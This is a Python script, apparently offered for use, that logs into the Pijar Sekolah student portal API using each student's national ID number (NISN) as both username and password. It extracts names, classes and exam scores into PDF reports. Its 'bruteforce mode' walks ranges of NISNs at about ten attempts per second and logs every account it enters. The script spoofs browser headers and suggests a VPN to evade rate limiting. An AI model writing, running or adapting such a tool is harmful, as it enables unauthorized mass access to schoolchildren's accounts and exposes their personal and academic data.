import requests
import json
import sys
import time
from datetime import datetime
import os
import threading
from reportlab.lib import colors
from reportlab.lib.pagesizes import A4
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph, Spacer
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch
from reportlab.pdfgen import canvas
from reportlab.lib.enums import TA_CENTER, TA_LEFT

# ANSI Colors for terminal output
class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    RESET = '\033[0m'

# Base URLs and endpoints - Updated with correct endpoints
LOGIN_URL = "https://auth-api.pijarsekolah.id/student/login"
SCORE_URL = "https://api.pijarsekolah.id/exam/v2/score?page=1&size=50&mapel=&jenis_ujian=non-akm&sort_by=terbaru&tahun=2025"
STATUS_URL = "https://auth-api.pijarsekolah.id/student/status" # To get user profile details

# Files for logging
log_dir = "logs"
pdf_dir = "reports"
log_file = os.path.join(log_dir, "scores.log")
cache_file = os.path.join(log_dir, "attempts.log")

# Global variable to control execution
running = True

# Ensure directories exist
for directory in [log_dir, pdf_dir]:
    if not os.path.exists(directory):
        os.makedirs(directory)

# Function to attempt login with NISN - Updated with additional headers and error handling
def try_login(nisn):
    print(f"{Colors.CYAN}>> Attempting login for NISN: {nisn}{Colors.RESET}")
    
    # Format NISN with leading zeros if needed
    if len(nisn) < 10:
        nisn = nisn.zfill(10)
    
    # Prepare login data
    login_data = {
        "nisn": nisn,
        "password": nisn,  # Using NISN as password
        "role": "student",
        "fcmToken": ""
    }
    
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "Origin": "https://siswa.pijarsekolah.id",
        "Referer": "https://siswa.pijarsekolah.id/",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="124"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"'
    }
    
    try:
        # Allow retries for network issues
        max_retries = 3
        for attempt in range(max_retries):
            try:
                response = requests.post(LOGIN_URL, json=login_data, headers=headers, timeout=10)
                break
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
                if attempt < max_retries - 1:
                    print(f"{Colors.YELLOW}>> Network error, retrying... ({attempt+1}/{max_retries}){Colors.RESET}")
                    time.sleep(2)
                else:
                    raise e
        
        # Check if the request was successful
        if response.status_code == 200:
            response_data = response.json()
            
            # Check if login was successful
            if response_data.get('success') == True and 'data' in response_data:
                token = response_data['data'].get('token')
                print(f"{Colors.GREEN}>> Login successful!{Colors.RESET}")
                return token
            else:
                print(f"{Colors.RED}>> Login failed: {response_data.get('message', 'Unknown error')}{Colors.RESET}")
                return None
        else:
            print(f"{Colors.RED}>> Login request failed with status code: {response.status_code}{Colors.RESET}")
            if response.status_code == 404:
                print(f"{Colors.YELLOW}>> The login endpoint may have changed. Please check the API URL.{Colors.RESET}")
            elif response.status_code == 429:
                print(f"{Colors.YELLOW}>> Too many requests. The server is rate limiting. Wait and try again.{Colors.RESET}")
            try:
                error_detail = response.json()
                print(f"{Colors.YELLOW}>> Error details: {json.dumps(error_detail)}{Colors.RESET}")
            except:
                print(f"{Colors.YELLOW}>> Response content: {response.text[:200]}{Colors.RESET}")
            return None
    except Exception as e:
        print(f"{Colors.RED}>> Error during login request: {str(e)}{Colors.RESET}")
        return None

# Function to get user status/profile
def get_user_status(token):
    print(f"{Colors.CYAN}>> Fetching user profile...{Colors.RESET}")
    
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Authorization": f"Bearer {token}",
        "Connection": "keep-alive",
        "Origin": "https://siswa.pijarsekolah.id",
        "Referer": "https://siswa.pijarsekolah.id/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="124"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"'
    }
    
    try:
        response = requests.get(STATUS_URL, headers=headers, timeout=10)
        
        # Check if the request was successful
        if response.status_code == 200:
            return response.json()
        else:
            print(f"{Colors.RED}>> Profile request failed with status code: {response.status_code}{Colors.RESET}")
            return None
    except Exception as e:
        print(f"{Colors.RED}>> Error during profile request: {str(e)}{Colors.RESET}")
        return None

# Function to get user scores
def get_user_scores(token):
    print(f"{Colors.CYAN}>> Fetching score data...{Colors.RESET}")
    
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Authorization": f"Bearer {token}",
        "Connection": "keep-alive",
        "Origin": "https://siswa.pijarsekolah.id",
        "Referer": "https://siswa.pijarsekolah.id/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="124"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"'
    }
    
    try:
        max_retries = 3
        for attempt in range(max_retries):
            try:
                response = requests.get(SCORE_URL, headers=headers, timeout=10)
                break
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
                if attempt < max_retries - 1:
                    print(f"{Colors.YELLOW}>> Network error, retrying... ({attempt+1}/{max_retries}){Colors.RESET}")
                    time.sleep(2)
                else:
                    raise e
        
        # Check if the request was successful
        if response.status_code == 200:
            response_data = response.json()
            
            # Check if data retrieval was successful
            if response_data.get('success') == True and 'data' in response_data:
                print(f"{Colors.GREEN}>> Score data retrieved successfully!{Colors.RESET}")
                return response_data
            else:
                print(f"{Colors.RED}>> Failed to retrieve scores: {response_data.get('message', 'Unknown error')}{Colors.RESET}")
                return None
        else:
            print(f"{Colors.RED}>> Score request failed with status code: {response.status_code}{Colors.RESET}")
            try:
                error_detail = response.json()
                print(f"{Colors.YELLOW}>> Error details: {json.dumps(error_detail)}{Colors.RESET}")
            except:
                print(f"{Colors.YELLOW}>> Response content: {response.text[:200]}{Colors.RESET}")
            return None
    except Exception as e:
        print(f"{Colors.RED}>> Error during score request: {str(e)}{Colors.RESET}")
        return None

# Function to log successful login
def log_success(nisn, class_name, full_name):
    with open(log_file, 'a') as f:
        f.write(f"[{datetime.now()}] SUCCESS - NISN: {nisn}, Name: {full_name}, Class: {class_name}\n")

# Function to generate PDF report
def generate_pdf_report(score_data, nisn, profile_data=None):
    print(f"{Colors.CYAN}>> Generating PDF report...{Colors.RESET}")
    
    # Extract student name and class information from profile data if available
    if profile_data and profile_data.get('success') == True and 'data' in profile_data:
        user_data = profile_data['data']
        student_name = user_data.get('fullName', 'Unknown')
        class_info = user_data.get('className', 'Unknown')
    # Otherwise use data from the first score entry
    elif len(score_data['data']) > 0:
        student_name = score_data['data'][0].get('nama', 'Unknown')
        # Extract class from the nama_paket field (e.g., "ASTS XI 8 SENI MUSIK" -> "XI 8")
        class_info = "Unknown"
        nama_paket = score_data['data'][0].get('nama_paket', '')
        if 'XI' in nama_paket:
            parts = nama_paket.split()
            for i, part in enumerate(parts):
                if part == 'XI' and i + 1 < len(parts):
                    class_info = f"XI {parts[i+1]}"
                    break
    else:
        student_name = "Unknown"
        class_info = "Unknown"
    
    # Create filename with timestamp
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(pdf_dir, f"scores_{nisn}_{timestamp}.pdf")
    
    # Create PDF document
    doc = SimpleDocTemplate(
        filename,
        pagesize=A4,
        rightMargin=72,
        leftMargin=72,
        topMargin=72,
        bottomMargin=72
    )
    
    # Define styles
    styles = getSampleStyleSheet()
    title_style = ParagraphStyle(
        name='TitleStyle',
        parent=styles['Heading1'],
        alignment=TA_CENTER,
        fontName='Helvetica-Bold',
        fontSize=16,
        spaceAfter=12
    )
    subtitle_style = ParagraphStyle(
        name='SubtitleStyle',
        parent=styles['Heading2'],
        alignment=TA_LEFT,
        fontName='Helvetica-Bold',
        fontSize=12,
        spaceAfter=6
    )
    
    # Prepare data for PDF
    elements = []
    
    # Add title
    elements.append(Paragraph("STUDENT EXAM SCORE REPORT", title_style))
    elements.append(Spacer(1, 0.25 * inch))
    
    # Add student information
    elements.append(Paragraph(f"Name: {student_name}", subtitle_style))
    elements.append(Paragraph(f"NISN: {nisn}", subtitle_style))
    elements.append(Paragraph(f"Class: {class_info}", subtitle_style))
    elements.append(Paragraph(f"Date Generated: {datetime.now().strftime('%d %B %Y, %H:%M:%S')}", subtitle_style))
    elements.append(Spacer(1, 0.5 * inch))
    
    # Prepare table data
    table_data = [["No.", "Subject", "Score", "Exam Type", "Teacher", "Status"]]
    
    # Add score data to table
    for idx, score in enumerate(score_data['data'], 1):
        subject = score.get('nama_pelajaran', 'N/A')
        score_value = score.get('hasil_penilaian', 'N/A')
        exam_type = score.get('jenis_ujian', 'N/A')
        teacher = score.get('guru_pembuat', 'N/A')
        status = score.get('status_penilaian', 'N/A')
        
        table_data.append([str(idx), subject, str(score_value), exam_type, teacher, status])
    
    # Create table and set style
    table = Table(table_data, repeatRows=1)
    table_style = TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.darkblue),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
        ('ALIGN', (0, 0), (-1, 0), 'CENTER'),
        ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
        ('FONTSIZE', (0, 0), (-1, 0), 12),
        ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
        ('BACKGROUND', (0, 1), (-1, -1), colors.white),
        ('GRID', (0, 0), (-1, -1), 1, colors.black),
        ('ALIGN', (0, 0), (0, -1), 'CENTER'),  # Center the No. column
        ('ALIGN', (2, 1), (2, -1), 'CENTER'),  # Center the Score column
        ('VALIGN', (0, 0), (-1, -1), 'MIDDLE'),
        ('FONTNAME', (0, 1), (-1, -1), 'Helvetica'),
        ('FONTSIZE', (0, 1), (-1, -1), 10),
        ('ROWBACKGROUNDS', (0, 1), (-1, -1), [colors.white, colors.lightgrey])
    ])
    
    # Color coding for scores
    for i, row in enumerate(table_data[1:], 1):
        if row[2] != 'N/A':
            try:
                score_value = float(row[2])
                if score_value >= 85:
                    # Green for excellent scores
                    table_style.add('TEXTCOLOR', (2, i), (2, i), colors.darkgreen)
                    table_style.add('FONTNAME', (2, i), (2, i), 'Helvetica-Bold')
                elif score_value >= 70:
                    # Blue for good scores
                    table_style.add('TEXTCOLOR', (2, i), (2, i), colors.blue)
                elif score_value < 60:
                    # Red for poor scores
                    table_style.add('TEXTCOLOR', (2, i), (2, i), colors.red)
            except ValueError:
                pass
    
    table.setStyle(table_style)
    elements.append(table)
    
    # Add footer note
    elements.append(Spacer(1, 0.5 * inch))
    note_style = styles["Italic"]
    note_style.alignment = TA_CENTER
    elements.append(Paragraph("This report is generated automatically by NISN Score Extractor", note_style))
    
    # Build the PDF
    doc.build(elements)
    
    print(f"{Colors.GREEN}>> PDF report generated: {filename}{Colors.RESET}")
    return filename

# Function to log attempt to cache
def log_attempt(nisn):
    with open(cache_file, 'a') as f:
        f.write(f"[{datetime.now()}] Attempted login for NISN: {nisn}\n")

# Main function
def main():
    global running
    
    print(f"{Colors.MAGENTA}{'='*60}{Colors.RESET}")
    print(f"{Colors.MAGENTA}          NISN SCORE EXTRACTOR & PDF GENERATOR          {Colors.RESET}")
    print(f"{Colors.MAGENTA}{'='*60}{Colors.RESET}")
    
    # Get NISN from user
    while True:
        nisn = input(f"{Colors.BLUE}>> Enter student NISN: {Colors.RESET}")
        if nisn.strip() and nisn.isdigit():
            break
        print(f"{Colors.RED}>> Invalid NISN. Please enter a valid numeric NISN.{Colors.RESET}")
    
    # Log the attempt
    log_attempt(nisn)
    
    # Try login
    token = try_login(nisn)
    
    if token:
        # Get user profile information
        profile_data = get_user_status(token)
        
        # Get scores
        score_data = get_user_scores(token)
        
        if score_data and score_data.get('data'):
            # Generate PDF report
            pdf_file = generate_pdf_report(score_data, nisn, profile_data)
            
            # Log success
            if profile_data and profile_data.get('success') == True and 'data' in profile_data:
                user_data = profile_data['data']
                class_name = user_data.get('className', 'Unknown')
                full_name = user_data.get('fullName', 'Unknown')
                log_success(nisn, class_name, full_name)
            else:
                with open(log_file, 'a') as f:
                    f.write(f"[{datetime.now()}] Successfully extracted scores for NISN {nisn} - PDF: {pdf_file}\n")
            
            print(f"{Colors.GREEN}>> Success! Score data has been extracted and saved to: {pdf_file}{Colors.RESET}")
            print(f"{Colors.BLUE}>> Found {len(score_data['data'])} exam scores.{Colors.RESET}")
        else:
            print(f"{Colors.RED}>> No score data found for NISN: {nisn}{Colors.RESET}")
    else:
        print(f"{Colors.RED}>> Could not login with NISN: {nisn}. Please check and try again.{Colors.RESET}")
        print(f"{Colors.YELLOW}>> Tips:{Colors.RESET}")
        print(f"{Colors.YELLOW}>> 1. Make sure you're using a valid NISN{Colors.RESET}")
        print(f"{Colors.YELLOW}>> 2. Check your internet connection{Colors.RESET}")
        print(f"{Colors.YELLOW}>> 3. The API endpoint might have changed or be temporarily unavailable{Colors.RESET}")
        print(f"{Colors.YELLOW}>> 4. Consider using a VPN if you're being rate limited{Colors.RESET}")

# Bruteforce mode function
def bruteforce_mode():
    global running
    
    print(f"{Colors.MAGENTA}{'='*60}{Colors.RESET}")
    print(f"{Colors.MAGENTA}          NISN BRUTEFORCE SCORE EXTRACTOR          {Colors.RESET}")
    print(f"{Colors.MAGENTA}{'='*60}{Colors.RESET}")
    
    # Get NISN range from user
    start_nisn = input(f"{Colors.BLUE}>> Enter starting NISN: {Colors.RESET}")
    if not start_nisn.strip() or not start_nisn.isdigit():
        print(f"{Colors.RED}>> Invalid starting NISN. Using default: 89600042{Colors.RESET}")
        start_nisn = 89600042
    else:
        start_nisn = int(start_nisn)
    
    end_nisn = input(f"{Colors.BLUE}>> Enter ending NISN: {Colors.RESET}")
    if not end_nisn.strip() or not end_nisn.isdigit():
        print(f"{Colors.RED}>> Invalid ending NISN. Using default: {start_nisn + 10}{Colors.RESET}")
        end_nisn = start_nisn + 10
    else:
        end_nisn = int(end_nisn)
    
    print(f"{Colors.BLUE}[*] Starting brute force attack from {start_nisn} to {end_nisn}{Colors.RESET}")
    print(f"{Colors.BLUE}[*] Results will be logged to {log_file}{Colors.RESET}")
    print(f"{Colors.BLUE}[*] Attempts will be cached in {cache_file}{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Type 'exit' at any time to stop the script{Colors.RESET}")
    print(f"{Colors.BLUE}[*] Processing speed: ~10 NISN per second (100ms delay){Colors.RESET}")
    
    # Create or clear the log file
    with open(log_file, 'w') as f:
        f.write(f"# Brute Force Results - {datetime.now()}\n")
    
    # Create or clear the cache file
    with open(cache_file, 'w') as f:
        f.write(f"# Brute Force Attempts - {datetime.now()}\n")
    
    # Start the exit listener in a separate thread
    exit_thread = threading.Thread(target=exit_listener)
    exit_thread.daemon = True
    exit_thread.start()
    
    attempts = 0
    successful = 0
    failed = 0
    
    # Start the brute force loop
    for i in range(start_nisn, end_nisn + 1):
        if not running:
            break
            
        nisn = f"{i}"
        attempts += 1
        
        print(f"{Colors.CYAN}>> Attempting login for NISN: {nisn} (Attempt #{attempts}){Colors.RESET}")
        
        # Log attempt to cache file
        log_attempt(nisn)
        
        # Try login
        token = try_login(nisn)
        
        # If login successful, get user status
        if token:
            successful += 1
            status_data = get_user_status(token)
            
            # If status request successful, log the details
            if status_data and status_data.get('success') == True and 'data' in status_data:
                user_data = status_data['data']
                class_name = user_data.get('className', 'Unknown')
                full_name = user_data.get('fullName', 'Unknown')
                
                print(f"{Colors.GREEN}>> Found user: {full_name}, Class: {class_name}, NISN: {nisn}{Colors.RESET}")
                log_success(nisn, class_name, full_name)
            else:
                print(f"{Colors.RED}>> Failed to get user status for NISN: {nisn}{Colors.RESET}")
        else:
            failed += 1
        
        # Use 100ms delay (0.1 seconds) to process ~10 NISN per second
        time.sleep(0.1)
    
    print(f"{Colors.MAGENTA}[*] Bruteforce completed or stopped{Colors.RESET}")
    print(f"{Colors.MAGENTA}[*] Attempts: {attempts}, Successful: {successful}, Failed: {failed}{Colors.RESET}")

# Function to listen for exit command
def exit_listener():
    global running
    while running:
        command = input().strip().lower()
        if command == "exit":
            print(f"{Colors.YELLOW}>> Exiting script...{Colors.RESET}")
            running = False
            break

if __name__ == "__main__":
    try:
        # Choose mode
        print(f"{Colors.MAGENTA}{'='*60}{Colors.RESET}")
        print(f"{Colors.MAGENTA}          NISN SCORE EXTRACTOR & PDF GENERATOR          {Colors.RESET}")
        print(f"{Colors.MAGENTA}{'='*60}{Colors.RESET}")
        print(f"{Colors.BLUE}>> Select mode:{Colors.RESET}")
        print(f"{Colors.BLUE}>> 1. Single NISN mode{Colors.RESET}")
        print(f"{Colors.BLUE}>> 2. Bruteforce mode{Colors.RESET}")
        
        mode = input(f"{Colors.BLUE}>> Enter your choice (1/2): {Colors.RESET}")
        
        if mode == "2":
            bruteforce_mode()
        else:
            main()
    except KeyboardInterrupt:
        print(f"{Colors.YELLOW}>> Script interrupted by user. Exiting...{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}>> An unexpected error occurred: {str(e)}{Colors.RESET}")
        sys.exit(1)
